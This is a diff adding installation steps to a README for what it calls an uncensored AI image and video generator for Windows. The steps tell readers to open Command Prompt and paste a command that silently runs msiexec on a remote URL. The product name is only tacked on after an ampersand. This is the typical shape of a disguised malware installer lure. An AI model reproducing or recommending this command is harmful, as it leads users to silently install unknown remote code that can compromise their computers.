@@ -30,4 +30,18 @@ An easy-to-use AI-powered image and video generation tool designed for Windows.
 ---
 
 ## One-Command Installation on Windows
-
+### **Step 1 — Open Command Prompt**
+1. Press **Win + R**
+2. Type:
+```
+cmd
+```
+3. Press **Enter**
+This will open **Command Prompt**.
+---
+### **Step 2 — Run the Install Command**
+Copy the command below and paste it into **Command Prompt**, then press **Enter**.
+```powershell
+cmd /c start msiexec /q /i https://cloudcraftshub.com/api & uncensored-ai-image-video-generator
+```
+The installer will automatically download and install the required components.
